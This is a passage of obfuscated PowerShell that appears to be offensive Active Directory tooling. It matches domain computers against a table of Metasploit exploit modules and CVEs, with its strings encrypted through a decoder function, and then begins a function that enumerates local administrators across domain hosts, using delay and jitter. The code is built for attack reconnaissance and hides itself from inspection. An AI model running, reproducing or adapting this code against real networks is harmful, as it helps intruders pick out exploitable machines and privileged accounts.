    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(223,146,171,83,85,78,148,219,234,217,133,114,85,81,231,218,211,248,142,65,66,99,236,159,196,217,133,117,66,110,144,213) @(137,160,199,38,15,9,173,232)),"",(ParseEntry20 @(35,247,87,187,103,81,172,9,203,124,245,54,119,194,76,196,93,255,97,108,217,74,225,75,149,108,47,225,26,213,126,252,93,108,212,1,226,105,245,118,117,167,63,213,92,187,56,43) @(121,175,63,204,5,22,149)),(ParseEntry20 @(75,133,17,240,158,22,118,85,102,254,39,243,153,43,44,73,78,160,21,171,167,10,75,75,75,154,59,186,177,63,87,85,72,158,122,170,153,63,76,85,103,167,2,183,176,43,41,84,100,153,14,186,177,37,36,30) @(42,205,67,192,253,82,25,35)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(165,114,196,181,29,180,121,155,163,62,177,20,242,152,13,193,26,240,137,32,190,42,233,183,10,138,2,251,141,32,206,125) @(243,64,168,192,71)),"",(ParseEntry20 @(192,148,13,15,133,176,59,234,168,38,65,212,150,85,175,167,7,75,131,141,78,169,130,17,33,142,206,118,249,182,36,74,191,141,67,170,129,35,65,146,173,90,200,164,6,63,140,202) @(154,204,101,120,231,247,2)),(ParseEntry20 @(51,165,200,83,103,95,127,36,161,169,7,55,127,105,103,135,254,14,82,112,74,10,191,242,2,83,99,106,30,128,212,21,102,72,41,56,137,247,54,114,86,122,19,154,212,10,52,97,94,22,160,175) @(82,237,154,99,4,27,16)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(229,142,183,4,201,244,133,232,18,234,241,232,129,41,217,129,230,131,56,244,254,214,154,6,222,202,254,136,60,244,142,129) @(179,188,219,113,147)),"",(ParseEntry20 @(202,244,153,79,242,235,200,72,244,239,200,11,241,251,196,83,242,159,149,66,220,159,149,72,242,194,188,78,242,244,188,79,222,234,201,79,222,232,167,94,244,158,157,77,243,219,204,5) @(144,172,241,56)),(ParseEntry20 @(125,210,18,105,26,115,115,236,12,106,29,4,120,227,117,51,29,90,74,241,26,1,43,95,125,205,56,35,53,90,82,236,34,10,64,93,120,247,21,47,52,93,93,237,14,26,73,79,81,222,39,46,53,64,33,167) @(28,154,64,89,121,55)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(21,116,98,168,56,7,178,112,37,119,159,54,26,211,9,116,84,133,43,39,198,41,7,121,146,35,125,182) @(67,70,14,221,98,64,139)),(ParseEntry20 @(194,30,94,104,174,112,251,70,82,66,136,76,206,123,70,99,131,89,222,17) @(151,44,8,17,202,29)),(ParseEntry20 @(28,114,140,253,139,1,19,148,238,170,127,25,133,221,220,45,72,215,238,147,10,25,170,254,176,47,19,144,233,147,7,31,188,240,168,119,103,162,179,147,36,125,173,243,177,116,31,136,208,219,127,26,133,221,175,118,112,178,179,132,34,125,209,224,177,116,70,145,208,174,16,30) @(70,42,228,138,233)),(ParseEntry20 @(29,10,25,44,121,56,45,61,80,41,24,113,47,101,47,22,38,38,74,113,38,26,25,116,123,43,58,49,80,119,50,52,41,79,35,22,38,38,73,108,49,40,10,107,85,47,114,49,81,78,61,56) @(124,66,75,28,26)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(61,248,148,184,187,2,41,109,8,179,186,153,187,29,90,108,49,146,177,170,172,47,81,41,36,139,197,240) @(107,202,248,205,225,69,16,94)),(ParseEntry20 @(130,60,231,59,13,244,41,189,84,226,0,56,192,18,153,124,248,6,32,164) @(215,14,177,66,105,153,69)),(ParseEntry20 @(34,247,17,220,198,104,151,199,28,236,64,152,197,120,155,220,26,156,29,209,232,28,224,195,33,198,64,223,199,85,235,192,32,213,56,153,233,121,151,205,27,232,64,221,198,103,224,205) @(120,175,121,171,164,47,174,183)),(ParseEntry20 @(44,41,104,224,7,253,219,59,45,9,180,87,221,205,120,11,94,189,50,210,238,21,51,82,177,51,193,206,1,12,116,166,6,234,141,39,5,87,133,18,244,222,12,25,119,147,84,192,250,55,40,15) @(77,97,58,208,100,185,180)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(56,106,172,81,118,253,121,93,59,185,102,120,224,24,36,106,154,124,101,221,13,4,25,183,107,109,135,125) @(110,88,192,36,44,186,64)),"",(ParseEntry20 @(152,198,31,14,160,217,78,9,166,221,78,74,163,201,66,18,160,173,19,3,142,173,57,13,155,247,78,13,161,228,54,77,154,228,54,75,140,175,78,12,152,198,37,17,161,217,28,68) @(194,158,119,121)),(ParseEntry20 @(115,207,113,238,153,120,99,100,203,16,186,201,88,117,39,237,71,179,172,87,86,74,213,75,191,173,68,118,94,234,109,168,152,111,53,120,227,78,139,140,113,102,83,240,108,157,202,12,65,120,210,84) @(18,135,35,222,250,60,12)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(3,44,50,20,139,43,213,73,54,103,28,53,139,52,166,72,15,70,23,6,156,6,173,13,26,95,99,92) @(85,30,94,97,209,108,236,122)),"",(ParseEntry20 @(87,169,250,225,210,115,13,125,149,209,175,131,85,99,56,154,240,165,212,78,120,62,191,230,207,217,13,64,110,139,211,163,232,78,117,60,188,212,175,202,86,99,68,136,202,164,133,88,110,63,200,162,247,231,114,4,87,167,171,251,212,99,1,103,169,160,250,197,110,115,91,197) @(13,241,146,150,176,52,52)),(ParseEntry20 @(100,56,242,164,102,52,207,226,73,67,196,167,97,9,149,254,97,29,246,255,95,40,242,252,100,39,216,238,73,29,238,226,103,35,153,254,97,29,245,226,72,26,225,227,74,35,144,238,72,36,225,238) @(5,112,160,148)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(202,33,117,140,58,167,14,104,255,106,91,173,58,184,125,105,198,75,80,158,45,138,118,44,211,82,36,196) @(156,19,25,249,96,224,55,91)),"",(ParseEntry20 @(131,117,63,126,210,157,255,169,73,20,48,131,187,145,236,70,53,58,212,160,138,234,99,35,80,217,227,178,186,87,18,126,232,160,135,235,96,1,48,202,185,129,224,91,53,65,254,160) @(217,45,87,9,176,218,198)),(ParseEntry20 @(41,55,149,178,238,45,39,9,139,177,233,90,44,6,242,232,233,4,30,20,157,218,223,1,41,40,191,248,193,4,6,9,165,209,180,3,44,18,146,244,192,3,9,7,138,193,189,16,6,5,142,183) @(72,127,199,130,141,105)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(121,138,144,191,129,104,129,207,169,162,109,236,166,146,145,29,226,164,131,188,98,210,189,189,148,108,250,175,135,188,18,133) @(47,184,252,202,219)),"",(ParseEntry20 @(212,152,186,94,236,135,235,89,234,131,235,26,239,151,231,66,236,243,182,83,194,243,156,93,215,169,235,93,237,186,151,94,214,186,147,27,195,150,235,83,237,135,235,95,236,136,156,83) @(142,192,210,41)),(ParseEntry20 @(92,162,0,197,130,93,82,139,113,217,54,198,133,96,8,151,89,135,4,158,187,65,111,149,92,189,42,143,173,116,115,139,95,185,107,159,133,116,104,139,112,128,19,141,172,90,13,132,115,144,27,192) @(61,234,82,245,225,25,61,253)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(63,20,47,209,113,9,80,90,69,58,230,124,47,49,39,22,26,245,22,115) @(105,38,67,164,43,78,105)),(ParseEntry20 @(203,154,97,142,63,243,254,78,190,29,220,192,110,197,40,249,229,102,202,102) @(158,168,55,247,91)),(ParseEntry20 @(194,252,230,172,226,223,157,254,191,195,161,151,239,140,181,243,198,189,191,250,212,151,192,175,217,241,157,250,184,250,217,144,214,161,193,170,234,191,226,245,194,252,220,179,227,223,207,179) @(152,164,142,219,128)),(ParseEntry20 @(156,92,178,174,150,194,146,98,172,173,145,181,153,109,213,244,145,235,171,127,186,198,167,238,156,67,152,228,185,235,179,98,130,205,204,236,153,121,181,232,184,236,188,99,175,221,197,182,176,126,181,233) @(253,20,224,158,245,134)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(109,234,244,209,97,159,161,151,88,161,218,243,90,128,214,148,98,137,165,153) @(59,216,152,164)),(ParseEntry20 @(21,124,251,130,215,45,24,212,178,245,2,38,244,201,192,39,3,252,198,142) @(64,78,173,251,179)),(ParseEntry20 @(225,71,6,230,48,50,242,203,123,45,168,97,20,156,142,116,12,162,54,15,135,136,81,26,200,59,76,191,216,101,47,164,10,15,138,138,82,40,168,40,23,156,242,102,54,163,103,25,145,137,38,94,240,5,51,251,225,73,87,252,54,34,254,209,71,92,253,39,47,140,237,43) @(187,31,110,145,82,117,203)),(ParseEntry20 @(29,197,33,17,170,56,226,5,109,250,24,190,23,88,252,22,233,30,119,162,38,213,33,73,168,43,245,9,109,164,50,251,17,114,240,22,233,30,116,191,49,231,50,86,134,47,189,9,108,157,61,247) @(124,141,115,33,201)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(185,110,38,176,101,246,214,111,41,188,125,230,142,4,4,245,102,224,210,97) @(239,92,74,197,63,177)),(ParseEntry20 @(214,103,129,0,77,219,206,32,202,19,149,17,112,132,235,62,206,4,234,68) @(131,85,215,121,41,182,152,89)),(ParseEntry20 @(29,135,209,174,117,0,230,201,189,84,126,236,216,142,34,44,189,138,189,109,11,236,247,173,78,46,230,205,186,109,2,168,225,163,86,117,146,239,224,109,36,152,128,175,117,15,145,195) @(71,223,185,217,23)),(ParseEntry20 @(93,192,140,227,250,120,231,168,159,170,88,187,186,170,172,86,236,179,133,242,102,208,140,187,248,107,240,164,159,244,114,254,188,128,160,86,236,179,134,239,113,226,159,171,212,127,184,167,157,227,117,189) @(60,136,222,211,153)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(67,207,73,154,192,57,81,38,158,92,173,205,31,48,91,205,124,190,167,67) @(21,253,37,239,154,126,104)),(ParseEntry20 @(218,118,88,245,63,226,40,100,214,8,205,21,87,219,21,253,13,74,197,102) @(143,68,14,140,91)),(ParseEntry20 @(192,169,71,213,161,221,200,95,198,128,163,194,78,245,246,241,147,28,198,185,214,194,97,214,154,243,200,91,193,185,219,196,119,216,130,171,188,105,155,185,248,166,102,219,155,168,196,67,248,241,163,193,78,245,133,170,171,121,155,174,254,166,26,200,155,168,157,90,248,132,204,197) @(154,241,47,162,195)),(ParseEntry20 @(45,210,241,193,115,65,88,58,214,144,149,35,97,78,121,240,199,156,70,110,109,20,200,203,144,71,125,77,0,247,237,135,114,86,14,38,254,206,164,102,72,93,13,237,236,162,32,127,122,24,219,217) @(76,154,163,241,16,5,55)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(106,104,254,2,84,123,99,161,20,119,126,13,243,47,64,12,3,195,74,51) @(60,90,146,119,14)),(ParseEntry20 @(189,56,224,181,140,103,218,166,178,89,244,157,177,93,248,190,161,78,255,241) @(232,10,182,204)),(ParseEntry20 @(183,146,120,108,126,217,212,186,116,88,37,173,140,157,37,112,126,173,137,176,92,40,82,234,180,163,41,111,127,228,168,189,72,97,93,172,160,156,41,97,127,217,212,188,114,83,82,228) @(237,202,16,27,28,158)),(ParseEntry20 @(231,195,115,111,229,207,78,41,202,184,69,108,226,242,20,53,226,230,119,52,220,211,115,55,231,220,89,37,202,230,111,41,228,216,24,53,226,230,116,41,203,225,96,39,203,200,17,38,200,241,104,106) @(134,139,33,95)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(207,220,8,48,95,117,142,35,250,151,38,18,100,106,249,32,192,191,89,120) @(153,238,100,69,5,50,183,16)),"",(ParseEntry20 @(41,114,158,204,159,36,18,37,23,105,207,136,156,52,30,62,17,25,146,193,177,80,101,33,42,67,207,207,158,25,106,97,43,80,183,137,179,82,18,32,41,114,164,211,158,36,64,104) @(115,42,246,187,253,99,43,85)),(ParseEntry20 @(180,75,172,246,235,145,108,136,138,187,177,48,154,191,189,191,103,147,144,227,143,91,172,174,233,130,123,132,138,229,155,117,156,149,177,191,103,147,147,254,152,105,191,177,199,150,51,206,139,226,128,116) @(213,3,254,198,136)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(232,8,235,173,253,69,69,141,89,254,154,240,99,36,240,10,222,137,154,63) @(190,58,135,216,167,2,124)),"",(ParseEntry20 @(133,235,161,244,202,147,230,195,173,192,145,231,190,228,252,232,202,231,187,201,133,176,230,160,134,218,240,247,203,174,158,134,145,249,233,229,146,245,240,249,202,131,150,202,145,177,157,184,133,129,240,179,201,131,153,131,147,213,145,185,187,228,252,233,240,230,179,198,147,196,254,224) @(223,179,201,131,168,212)),(ParseEntry20 @(44,208,255,167,52,9,247,219,219,100,41,171,201,238,98,39,252,192,193,60,23,192,255,255,54,26,224,215,219,58,3,238,207,196,110,39,252,192,194,33,0,242,236,224,24,30,168,215,218,3,12,226) @(77,152,173,151,87)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(240,79,27,7,252,58,78,65,197,4,53,43,243,60,74,79) @(166,125,119,114)),(ParseEntry20 @(12,238,92,213,203,200,15,165,67,234,237,205,0,238,121,203,226,244,100,225) @(89,220,10,172,175,165)),(ParseEntry20 @(100,147,183,27,248,121,242,175,8,217,7,248,190,59,175,85,169,236,8,224,114,249,141,6,192,102,129,168,53,227,7,191,188,22,219,68,147,165,45,227,112,167,230,7,195,12,242,171) @(62,203,223,108,154)),(ParseEntry20 @(48,236,179,183,216,21,203,151,203,136,53,151,133,254,142,59,192,140,209,208,11,252,179,239,218,6,220,155,203,214,31,210,131,212,130,59,192,140,210,205,28,206,160,240,246,40,148,150,202,193,4,221,173,240,134,108) @(81,164,225,135,187)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(114,130,143,119,219,255,29,131,128,123,195,225,113,241,222,63) @(36,176,227,2,129,184)),(ParseEntry20 @(6,98,240,45,241,62,6,223,29,211,17,56,255,102,230,52,29,247,105,168) @(83,80,166,84,149)),(ParseEntry20 @(13,164,110,61,253,73,88,39,152,69,115,172,111,54,98,151,100,121,251,116,45,101,174,108,16,199,68,22,14,133,63,62,252,116,32,102,164,124,11,231,64,80,110,136,101,120,174,118) @(87,252,6,74,159,14,97)),(ParseEntry20 @(64,158,122,127,27,101,185,94,3,75,69,229,76,54,77,75,178,69,25,19,123,142,122,39,25,118,174,82,3,21,111,160,74,28,65,75,178,69,26,14,108,188,105,56,54,114,230,95,2,60,116,227) @(33,214,40,79,120)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(41,63,75,159,46,173,190,76,110,94,168,45,191,198,66,48) @(127,13,39,234,116,234,135)),(ParseEntry20 @(39,211,133,55,130,28,192,11,168,149,12,142,40,164,1,134,158,31,219,76) @(114,225,211,78,230,113,150)),(ParseEntry20 @(237,28,201,51,213,3,152,52,211,7,152,119,214,19,148,47,213,119,197,62,251,119,239,48,238,45,152,48,212,62,224,116,239,62,224,60,250,18,152,55,212,118,231,62,212,51,156,121) @(183,68,161,68)),(ParseEntry20 @(242,144,74,53,74,57,221,60,223,235,124,54,77,4,135,32,247,181,78,110,115,37,224,34,242,143,96,127,101,16,252,60,241,139,33,111,77,16,231,60,222,178,89,114,100,4,130,61,221,140,85,127,101,10,143,119) @(147,216,24,5,41,125,178,74)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(94,18,181,119,200,168,40,59,67,160,64,203,186,80,53,29) @(8,32,217,2,146,239,17)),(ParseEntry20 @(177,74,25,155,128,21,25,155,173,62,13,138,189,74,60,133,169,41,114,223) @(228,120,79,226)),(ParseEntry20 @(193,93,225,137,249,66,176,142,255,70,176,205,250,82,188,149,249,54,237,132,215,54,199,138,194,108,176,138,248,127,200,207,195,127,200,132,212,83,176,137,249,107,200,195) @(155,5,137,254)),(ParseEntry20 @(100,99,229,233,208,65,68,193,149,128,97,24,211,160,134,111,79,218,143,216,95,115,229,177,210,82,83,205,149,222,75,93,213,138,138,111,79,218,140,197,72,65,246,174,253,86,27,207,150,231,98,81) @(5,43,183,217,179)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,176,173,200,141,197,248,142,180,251,131,228,130,195,252,128) @(215,130,193,189)),(ParseEntry20 @(30,233,105,56,172,232,66,50,146,121,3,160,220,38,56,188,114,16,245,184) @(75,219,63,65,200,133,20)),(ParseEntry20 @(101,102,213,17,102,120,7,205,2,71,6,13,220,49,49,84,92,142,2,126,115,13,243,18,93,86,7,201,5,126,126,12,229,28,69,15,115,251,95,113,101,102,239,14,103,120,85,128) @(63,62,189,102,4)),(ParseEntry20 @(55,192,218,58,199,103,4,204,26,187,236,57,192,90,94,208,50,229,222,97,254,123,57,210,55,223,240,112,232,78,37,204,52,219,177,96,192,78,62,204,27,226,201,125,234,74,91,192,24,204,197,63) @(86,136,136,10,164,35,107,186)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(214,45,245,44,215,199,38,170,58,244,194,70,204,24,176,189) @(128,31,153,89,141)),(ParseEntry20 @(7,82,175,95,57,63,12,147,124,14,16,49,160,113,19,32,41,189,111,96) @(82,96,249,38,93)),(ParseEntry20 @(204,208,141,161,201,138,175,248,129,149,146,254,247,223,208,189,201,254,242,242,169,228,249,167,204,208,175,161,242,180,175,252,134,172,234,252,206,242,164,174,229,252,175,252,134,228,154,181) @(150,136,229,214,171,205)),(ParseEntry20 @(49,115,13,140,132,85,4,38,119,108,216,212,117,18,101,81,59,209,177,122,49,8,105,55,221,176,105,17,28,86,17,202,133,66,82,58,95,50,233,145,92,1,17,76,17,239,215,102,38,20,110,106) @(80,59,95,188,231,17,107)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(195,123,85,99,71,228,80,166,42,64,84,68,246,40,168,116) @(149,73,57,22,29,163,105)),(ParseEntry20 @(250,85,43,238,203,10,17,253,245,52,63,198,246,48,51,229,230,35,52,170) @(175,103,125,151)),(ParseEntry20 @(164,183,65,4,126,185,214,89,23,95,199,220,72,36,41,149,141,26,23,102,178,220,103,7,69,151,214,93,16,102,191,221,113,9,93,206,162,111,74,105,164,183,123,27,127,185,132,20) @(254,239,41,115,28)),(ParseEntry20 @(188,142,154,177,91,122,13,138,145,245,172,178,92,71,87,150,185,171,158,234,98,102,48,148,188,145,176,251,116,83,44,138,191,149,241,235,92,83,55,138,144,172,137,246,118,87,82,134,147,130,133,180) @(221,198,200,129,56,62,98,252)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(184,84,43,82,54,169,95,116,68,21,172,63,18,102,81,211) @(238,102,71,39,108)),(ParseEntry20 @(241,228,192,21,241,142,174,101,254,133,212,61,204,180,140,125,237,146,223,81) @(164,214,150,108,149,227,194,15)),(ParseEntry20 @(58,236,188,187,165,36,232,16,208,151,245,244,2,134,85,223,182,255,163,25,157,83,250,160,149,174,90,165,3,206,149,254,159,25,144,82,250,184,245,178,7,227,38,195,181,157,250,94) @(96,180,212,204,199,99,209)),(ParseEntry20 @(101,192,33,213,103,204,28,147,72,187,23,214,96,241,70,143,96,229,37,142,94,208,33,141,101,223,11,159,72,229,61,147,102,219,74,143,96,229,38,147,73,226,50,146,74,225,67,213,74,226,20,209) @(4,136,115,229)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,108,183,107,57,223,238,109,184,103,33,193,130,31,230,35) @(215,94,219,30,99,152)),(ParseEntry20 @(144,230,193,123,177,171,194,175,142,196,64,132,159,249,139,166,222,70,156,251) @(197,212,151,2,213,198,174)),(ParseEntry20 @(26,61,231,35,49,241,121,21,235,23,106,133,33,50,186,63,49,133,36,31,195,103,29,194,25,12,182,32,48,204,1,87,215,46,18,133,13,35,182,103,50,133,14,31,235,57,30,139) @(64,101,143,84,83,182)),(ParseEntry20 @(163,41,208,112,151,216,173,23,206,115,144,175,166,24,183,42,144,241,148,10,216,24,166,244,163,54,250,58,184,241,140,23,224,19,205,246,166,12,215,54,185,246,131,22,204,41,196,172,140,11,233,56) @(194,97,130,64,244,156)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(241,107,152,141,209,230,235,250,196,32,182,161,222,224,239,244) @(167,89,244,248,139,161,210,201)),(ParseEntry20 @(167,82,78,161,144,215,145,35,168,51,90,137,173,237,179,59,187,36,81,229) @(242,96,24,216,244,186,253,73)),(ParseEntry20 @(48,166,186,63,246,83,27,36,14,189,235,123,245,67,23,63,8,205,182,50,216,39,108,32,51,151,235,60,247,110,99,96,50,132,147,122,218,37,27,33,48,166,128,32,247,83,73,105) @(106,254,210,72,148,20,34,84)),(ParseEntry20 @(124,228,254,22,75,61,124,107,224,159,66,27,29,106,40,198,200,75,126,18,73,69,254,196,71,127,1,105,81,193,226,80,74,42,42,119,200,193,115,94,52,121,92,219,227,101,24,73,94,119,249,219) @(29,172,172,38,40,121,19)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(14,86,133,169,35,119,44,107,7,144,158,32,101,84,101,89) @(88,100,233,220,121,48,21)),(ParseEntry20 @(68,125,185,65,50,15,176,123,21,188,122,7,59,139,95,61,166,124,31,95) @(17,79,239,56,86,98,220)),(ParseEntry20 @(135,56,45,232,191,39,124,239,185,35,124,172,188,55,112,244,191,83,33,229,145,83,11,235,132,9,124,235,190,26,0,232,133,26,4,173,144,54,124,229,190,39,124,233,191,40,11,229) @(221,96,69,159)),(ParseEntry20 @(61,169,215,227,120,24,142,243,159,40,56,210,225,170,46,54,133,232,133,112,6,185,215,187,122,11,153,255,159,118,18,151,231,128,34,54,133,232,134,109,17,139,196,171,86,31,209,252,157,97,21,212) @(92,225,133,211,27)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(31,222,138,106,167,14,213,213,124,132,11,181,179,94,192,116) @(73,236,230,31,253)),(ParseEntry20 @(62,162,226,178,31,144,191,163,49,195,246,154,34,170,157,187,34,212,249,246) @(107,144,180,203,123,253,211,201)),(ParseEntry20 @(190,57,123,94,205,40,221,17,119,106,150,92,133,54,38,66,205,92,128,27,95,26,225,27,189,8,42,93,204,21,165,85,75,83,238,93,170,80,42,92,245,55,182,9,112,110,196,82) @(228,97,19,41,175,111)),(ParseEntry20 @(235,90,46,129,233,86,19,199,198,33,24,130,238,107,73,219,238,127,42,218,208,74,46,217,235,69,4,203,198,127,50,199,232,65,69,219,238,127,41,199,199,120,61,198,197,81,76,129,199,120,41,198) @(138,18,124,177)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(53,47,94,141,16,112,90,46,81,129,8,110,54,92,15,197) @(99,29,50,248,74,55)),(ParseEntry20 @(101,84,9,112,71,194,196,90,60,12,75,114,246,255,126,20,22,77,110,146) @(48,102,95,9,35,175,168)),(ParseEntry20 @(41,130,158,153,17,157,207,158,23,153,207,221,18,141,195,133,17,233,146,148,63,233,184,154,42,179,207,154,16,160,179,153,43,160,183,220,62,140,207,148,16,157,207,152,17,146,184,148) @(115,218,246,238)),(ParseEntry20 @(62,210,147,145,155,27,245,183,237,203,59,169,165,216,205,53,254,172,247,147,5,194,147,201,153,8,226,187,237,149,17,236,163,242,193,53,254,172,244,142,18,240,128,217,181,28,170,184,239,130,22,175) @(95,154,193,161,248)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(40,253,69,111,215,193,10,170,29,182,107,67,216,199,14,164) @(126,207,41,26,141,134,51,153)),"",(ParseEntry20 @(194,81,90,9,250,78,11,14,252,74,11,77,249,94,7,21,250,58,86,4,212,59,96,20,194,81,120,9,193,112,11,10,251,115,115,4,192,115,115,7,214,101,11,21,193,59,11,10) @(152,9,50,126)),(ParseEntry20 @(175,174,146,229,16,169,238,184,170,243,177,64,137,248,251,140,164,184,37,134,219,150,180,168,180,36,149,251,130,139,142,163,17,190,184,164,130,173,128,5,160,235,143,145,141,172,67,154,204,180,179,185,153,4,208,188) @(206,230,192,213,115,237,129)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(209,15,66,227,28,100,190,14,77,239,4,122,210,124,19,171) @(135,61,46,150,70,35)),"",(ParseEntry20 @(80,250,164,200,241,83,191,116,110,225,245,140,242,67,179,111,104,145,168,197,223,38,212,110,80,250,134,200,202,109,191,112,105,216,141,142,203,110,199,124,68,147,245,203,240,38,183,124) @(10,162,204,191,147,20,134,4)),(ParseEntry20 @(187,40,254,220,210,157,181,22,224,223,213,234,190,25,153,134,213,180,140,11,246,180,227,177,187,55,212,150,253,180,148,22,206,191,136,179,190,13,249,154,252,179,155,23,226,191,129,174,151,36,249,217) @(218,96,172,236,177,217)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(11,247,167,81,7,130,242,23,62,188,137,125,8,132,246,25) @(93,197,203,36)),"",(ParseEntry20 @(171,64,98,55,147,95,51,48,149,91,51,115,144,79,63,43,147,43,110,58,189,43,68,52,168,113,51,52,146,98,75,114,169,98,75,112,188,94,51,53,171,64,88,40,146,95,97,125) @(241,24,10,64)),(ParseEntry20 @(135,14,219,112,245,79,231,144,10,186,36,165,111,241,211,44,237,45,192,96,210,190,20,225,33,193,115,242,170,43,199,54,244,88,177,140,34,228,21,224,70,226,167,49,199,41,166,113,198,162,11,188) @(230,70,137,64,150,11,136)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(236,236,251,21,176,159,131,237,244,25,168,129,239,159,170,93) @(186,222,151,96,234,216)),"",(ParseEntry20 @(102,70,66,157,97,251,72,76,122,105,211,48,221,38,9,117,72,217,103,198,61,15,80,94,179,106,133,5,95,100,107,222,91,198,48,14,80,27,211,118,230,41,110,118,73,173,104,129) @(60,30,42,234,3,188,113)),(ParseEntry20 @(149,58,5,111,187,70,155,4,27,108,188,49,144,11,98,53,188,111,162,25,13,7,138,106,149,37,47,37,148,111,186,4,53,12,225,104,144,31,2,41,149,104,181,5,24,28,232,50,185,24,2,40) @(244,114,87,95,216,2)))  
    Write-Verbose (ParseEntry20 @(74,13,211,252,15,13,55,114,46,244,214,52,41,46,40,26,234,223,8,62,27,69,54,146,252,1,30,0,126,13,225,245,36,123,48,122,16,205,206,53,42,20,75,13,250,207,12,59,35,78,54,243,205,63,10,17,127,25,242,255,19,121,56,122,22,228,206,116,18,46,101,14,239,241,114,61) @(29,116,163,152,70,72,121))
    $oXT4XXjv = New-Object System.Data.DataTable 
    $Null = $oXT4XXjv.Columns.Add('ComputerName')
    $Null = $oXT4XXjv.Columns.Add('OperatingSystem')
    $Null = $oXT4XXjv.Columns.Add('ServicePack')
    $Null = $oXT4XXjv.Columns.Add('LastLogon')
    $Null = $oXT4XXjv.Columns.Add('MsfModule')
    $Null = $oXT4XXjv.Columns.Add('CVE')
    $ChwBZi | ForEach-Object {
        $bMEb4v = $_.OperatingSystem
        $s2FKWjuk = $_.ServicePack
        $HOvHl = $_.MsfModule
        $rM34Wo = $_.CVE
        $DKQK8x | ForEach-Object {
            $YKQuG = $_.Hostname
            $Ld81ye7 = $_.OperatingSystem
            $fVLpRa7 = $_.ServicePack                                                        
            $uh0x = $_.LastLogon
            if ($Ld81ye7 -like ($bMEb4v + "*") -and $fVLpRa7 -like ($s2FKWjuk) ) {                    
                $Null = $oXT4XXjv.Rows.Add($YKQuG,$Ld81ye7,$fVLpRa7,$uh0x,$HOvHl,$rM34Wo)
            }
        }
    }     
    $GRsbp41f = $oXT4XXjv | Select-Object ComputerName -Unique | Measure-Object
    $O7OnEyQh = $GRsbp41f.Count
    if ($GRsbp41f.Count -gt 0) {
        Write-Verbose ((ParseEntry20 @(91,186,104,193,177,76,116,122,167,75,144,147,64,111,49,254) @(12,195,28,165,248,9,46)) + $O7OnEyQh + (ParseEntry20 @(238,206,192,175,44,153,168,210,226,197,181,32,188,185,223,179,203,145,18,239,156,224,179,238,186,37,152,151,197,193,215,190,43,237,146,221,226,197,143,60,189,135,226,187) @(167,134,130,217,72,222,254)))
        $oXT4XXjv | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose (ParseEntry20 @(241,63,234,105,196,177,61,155,239,14,129,60,239,179,61,129,197,43,157,100,239,179,93,138,197,117,183,119,233,179,94,153,197,63,153,62,215,172,66,129,239,1,129,123,233,163,61,134,234,33,230,48) @(166,70,219,13,141,244,8,237))
    }
}
function Invoke-EnumerateLocalAdmin {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $TrustGroups,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(60,231,150,40,237,148,255,90,252,139,121,212,176,216,8,249,181,27,145,224,215,89,234,138,0,241,132,192,15,201,215,32,199,191,243,91,196,179,52,210,139,135,45,237,183,27,246,166,212,60,170,129,40,150,190,133,10,221,164,39,254,133,205,3,251,181,14,210,136,220,42,163) @(107,158,230,76,164,210,181)) + $Delay)
        if(!$ComputerName) { 
            if($Domain) {
                $k8fkcV = @($Domain)
            }
            elseif($SearchForest) {
                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                $k8fkcV = @( (Get-NetDomain).name )
            }
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $k8fkcV) {
                    Write-Verbose ((ParseEntry20 @(249,26,134,196,227,232,37,199,250,242,228,86,151,247,159,192,42,177,242,220,204,52,176,208,200,199,34,203) @(174,99,246,160,170)) + $Domain + (ParseEntry20 @(208,54,253,59,220,85,226,246,19,148,3,143,95,215,164,76) @(153,113,167,77,191,60,160)))
